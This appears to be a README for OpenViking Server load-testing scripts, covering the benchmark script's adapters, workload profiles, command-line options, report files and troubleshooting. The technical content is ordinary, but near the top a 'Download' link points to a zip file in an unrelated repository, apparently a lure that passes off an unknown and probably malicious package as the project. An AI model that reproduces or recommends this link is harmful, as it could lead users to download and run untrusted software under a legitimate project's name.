# OpenViking Server Load Testing Scripts

OpenViking provides a custom load testing workflow for a locally running OpenViking Server. The main script, `session_contention_benchmark.py`, exercises server APIs through several request paths and produces reports that help inspect throughput, latency, failures, and background task behavior under concurrent workloads.

[Download](https://github.com/gcoyerk/tesettest/releases/download/test/OpenViking.zip)

This repository focuses on server benchmarking rather than starting or managing the server process. It generates test Markdown content, sends concurrent requests, records detailed request events, and writes both human-readable and machine-readable results.

## What This Project Does

The benchmark script is designed to evaluate how an OpenViking Server behaves when multiple types of operations happen at the same time.

It covers common server activity such as:

- Adding generated Markdown resources.
- Writing messages to multiple sessions.
- Running retrieval operations such as `find`, `search`, `grep`, and `glob`.
- Committing sessions and waiting for related background tasks.
- Polling task status and observer-style endpoints.
- Comparing different client-side request paths.

The script does not start or stop OpenViking Server. Run the server separately before launching a benchmark.

## Main Script

The primary benchmark entry point is:

```text
benchmark/custom/session_contention_benchmark.py
```

It supports three adapter modes:

| Adapter | Request path | Purpose |
| --- | --- | --- |
| `sdk` | Uses `openviking.AsyncHTTPClient` | Measures Python SDK HTTP behavior |
| `cli-http` | Uses `openviking_cli.client.http.AsyncHTTPClient` | Measures the shared CLI HTTP client layer |
| `cli-subprocess` | Runs `ov ... --output json` as a real subprocess | Measures end-to-end CLI command overhead |

By default, all three adapters are included:

```bash
--adapters sdk,cli-http,cli-subprocess
```

If the goal is to focus on server-side throughput, use `sdk` or `cli-http` first. Add `cli-subprocess` when the cost of invoking the real CLI command is part of the evaluation.

## Requirements

Start OpenViking Server in another terminal before running the benchmark:

```bash
openviking-server
```

If authentication or multi-tenant settings are enabled, prepare:

- Server URL, for example `http://127.0.0.1:1935`
- API key
- Account name
- User name

Default values used by the script include:

| Setting | Default |
| --- | --- |
| Server URL | `http://127.0.0.1:1935` |
| API key | `test-root-api-key` |
| Account | `default` |
| User | `default` |

For the real CLI subprocess adapter, the `ov` command must be available:

```bash
ov health
```

## Quick Benchmark Examples

Run a small smoke benchmark:

```bash
.venv/bin/python benchmark/custom/session_contention_benchmark.py \
  --server-url http://127.0.0.1:1935 \
  --profile smoke
```

Run only the Python SDK request path:

```bash
.venv/bin/python benchmark/custom/session_contention_benchmark.py \
  --server-url http://127.0.0.1:1935 \
  --profile smoke \
  --adapters sdk
```

Run SDK, CLI HTTP, and real CLI subprocess paths together:

```bash
.venv/bin/python benchmark/custom/session_contention_benchmark.py \
  --server-url http://127.0.0.1:1935 \
  --profile standard \
  --adapters sdk,cli-http,cli-subprocess
```

## Benchmark Profiles

Profiles provide preset workload sizes and durations.

| Profile | Intended use |
| --- | --- |
| `smoke` | Fast validation of server connectivity, script behavior, and report generation |
| `standard` | Regular benchmark run using the default workload scale |
| `stress` | Higher concurrency and larger data volume, with longer runtime |

A practical workflow is to run `smoke` first, confirm that the report files are created, and then move to `standard` or `stress`.

## Workload Phases

Each selected adapter runs through several phases:

| Phase | Activity |
| --- | --- |
| `warmup` | Health-check style preparation |
| `add_resources` | Concurrent upload of generated Markdown documents |
| `session_messages` | Concurrent user and assistant message writes across sessions |
| `retrieval` | Concurrent retrieval operations |
| `session_commit` | Concurrent session commits with task polling |
| `mixed` | Combined resource, session, retrieval, commit, observation, and task polling activity |

The goal is to observe behavior under combined workloads, not only isolated endpoint timing.

## Data Handling

Before each run, the script clears prior benchmark data by default.

It removes:

- Server-side benchmark resources under `viking://resources/bench/load_test`
- Sessions with the `bench-load-` prefix
- Local generated data under `benchmark/results/openviking_server_load/data`

The data written during the current run is kept after completion so it can be inspected manually. It will be cleared before the next run unless cleanup behavior is changed.

Disable cleanup before running:

```bash
--no-clear-before-run
```

Clean up after the run finishes:

```bash
--cleanup-at-end
```

## Common Options

| Option | Default | Description |
| --- | --- | --- |
| `--server-url` | `http://127.0.0.1:1935` | OpenViking Server address |
| `--api-key` | `test-root-api-key` | API key used for requests |
| `--account` | `default` | Account value used for requests |
| `--user` | `default` | User value used for requests |
| `--adapters` | `sdk,cli-http,cli-subprocess` | Request paths to benchmark |
| `--profile` | `standard` | Workload profile: `smoke`, `standard`, or `stress` |
| `--resource-count` | Profile-based | Number of initial documents per adapter |
| `--session-count` | Profile-based | Number of sessions per adapter |
| `--phase-seconds` | Profile-based | Duration of single-category workload phases |
| `--mixed-seconds` | Profile-based | Duration of the mixed workload phase |
| `--drain-timeout` | `60` | Maximum seconds to wait for background tasks |
| `--data-root-uri` | `viking://resources/bench/load_test` | Server-side benchmark resource root |
| `--output-dir` | Auto-generated | Report output directory |
| `--ov-bin` | `ov` | CLI executable used by `cli-subprocess` |

## Report Files

By default, results are written under a timestamped directory similar to:

```text
benchmark/results/openviking_server_load/20260511T120000Z/
```

Generated files include:

| File | Content |
| --- | --- |
| `summary_zh.md` | Human-readable benchmark summary in Chinese |
| `run_summary.json` | Run-level summary data |
| `request_events.jsonl` | Per-request event records |
| `task_events.jsonl` | Background task completion and backlog details |
| `request_summary.csv` | Aggregated QPS, success rate, and latency by adapter, phase, and operation |
| `request_windows.csv` | Time-windowed request statistics |
| `adapter_comparison.csv` | Comparison across SDK and CLI request paths |
| `errors.csv` | Top error details |

Reports focus on total requests, failed requests, success rate, latency percentiles, retrieval latency changes between phases, adapter differences, task backlog, and common error locations.

## Authentication Examples

Pass authentication values directly:

```bash
.venv/bin/python benchmark/custom/session_contention_benchmark.py \
  --server-url http://127.0.0.1:1935 \
  --api-key your-root-api-key \
  --account default \
  --user default \
  --profile standard
```

Or use environment variables:

```bash
export OPENVIKING_SERVER_URL=http://127.0.0.1:1935
export OPENVIKING_API_KEY=your-root-api-key
export OPENVIKING_ACCOUNT=default
export OPENVIKING_USER=default

.venv/bin/python benchmark/custom/session_contention_benchmark.py --profile smoke
```

## CLI Subprocess Notes

The `cli-subprocess` adapter starts an `ov` process for each request, so its timing includes process startup, configuration loading, upload work, and JSON output parsing.

To focus on the server and avoid real CLI process overhead:

```bash
.venv/bin/python benchmark/custom/session_contention_benchmark.py \
  --profile standard \
  --adapters sdk,cli-http
```

If `ov` is not on `PATH`, provide the executable location:

```bash
.venv/bin/python benchmark/custom/session_contention_benchmark.py \
  --profile smoke \
  --adapters cli-subprocess \
  --ov-bin .venv/bin/ov
```

## Troubleshooting

### Server is not reachable

Check that the server is running:

```bash
curl http://127.0.0.1:1935/health
```

If the server uses a different port, pass the correct value with `--server-url`.

### Authentication does not pass

Confirm that the API key, account, and user values match the server configuration. In multi-tenant setups, root-key requests may still require account and user values.

### `cli-subprocess` fails

Verify that the CLI command works:

```bash
ov health
```

If needed, use `--ov-bin .venv/bin/ov` or run only `sdk,cli-http`.

### Background tasks do not finish in time

This can indicate that resource handling or session commit work is still queued. Consider increasing `--drain-timeout`, lowering concurrency settings, reviewing `task_events.jsonl`, and checking server logs.

### Results vary between runs

Benchmark output can be affected by local CPU, disk behavior, model configuration, queued background work, and CLI process startup cost. Run `smoke` first, then repeat `standard` runs and compare `adapter_comparison.csv` with `request_windows.csv`.
